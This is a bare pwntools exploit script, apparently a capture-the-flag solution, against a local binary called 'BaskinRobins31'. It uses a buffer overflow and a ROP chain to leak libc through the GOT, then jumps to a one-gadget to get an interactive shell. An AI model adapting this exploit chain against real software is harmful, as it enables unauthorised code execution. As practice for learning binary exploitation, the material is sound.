from pwn import *

p = process('./BaskinRobins31')
e = ELF('./BaskinRobins31')
context(arch='amd64',os='linux',endian='little',log_level='debug')

POP_RDI_RSI_RDX_RET = 0x0040087a
main = 0x400a4b

payload="A"*184
payload+=p64(POP_RDI_RSI_RDX_RET)
payload+=p64(1)
payload+=p64(e.got['read'])
payload+=p64(8)
payload+=p64(e.plt['write'])
payload+=p64(main)


p.send(payload)

#print p.recvuntil("Don't break the rules...:(")
p.recvuntil(":( \n")
read =  u64(p.recv(6)+"\x00"*2)
log.success("read leaked : "+hex(read))

libc_base = read - 0xf7250 # in local 
oneshot = libc_base + 0xf1147 # in local

payload1="A"*184
payload1+=p64(oneshot)

p.sendline(payload1)

p.interactive()
